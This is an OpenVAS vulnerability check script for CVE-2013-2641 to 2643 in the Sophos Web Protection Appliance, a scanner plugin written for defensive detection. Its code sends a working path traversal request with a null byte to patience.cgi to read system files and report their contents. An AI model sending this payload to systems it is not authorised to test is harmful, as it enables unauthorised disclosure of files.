###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sophos_web_appliance_mult_vuln_03_2013.nasl 11960 2018-10-18 10:48:11Z jschulte $
#
# Sophos Web Protection Appliance Web Interface Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:sophos:web_appliance';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103688");
  script_version("$Revision: 11960 $");
  script_cve_id("CVE-2013-2641", "CVE-2013-2642", "CVE-2013-2643");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_name("Sophos Web Protection Appliance Web Interface Multiple Vulnerabilities");
  script_tag(name:"last_modification", value:"$Date: 2018-10-18 12:48:11 +0200 (Thu, 18 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-04-04 14:28:20 +0200 (Thu, 04 Apr 2013)");
  script_xref(name:"URL", value:"http://www.sophos.com/en-us/support/knowledgebase/118969.aspx");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_sophos_web_appliance_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("sophos/web_appliance/installed");

  script_tag(name:"solution", value:"The vendor released version 3.7.8.2 to address these issues. Please see the references and contact the vendor for information on how to obtain and apply the updates");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Sophos Web Protection Appliance Web Interface is prone to multiple vulnerabilities.

  1) Unauthenticated local file disclosure
     Unauthenticated users can read arbitrary files from the filesystem with the
     privileges of the 'spiderman' operating system user.

  2) OS command injection
     Authenticated users can execute arbitrary commands on the underlying
     operating system with the privileges of the 'spiderman' operating system user.

  3) Reflected Cross Site Scripting (XSS)");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) ) exit( 0 );

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = '/cgi-bin/patience.cgi?id=../../../../../../../' + file + '%00';

  if( buf = http_vuln_check(port:port, url:url,pattern:pattern ) )
  {
    msg = 'By requesting the url ' + report_vuln_url( port:port, url:url, url_only:TRUE )  + '\nit was possible to retrieve the file /' + file + '. Response:\n\n' + buf + '\n';
    security_message(port:port, data:msg);
    exit(0);
  }
}

exit(99);
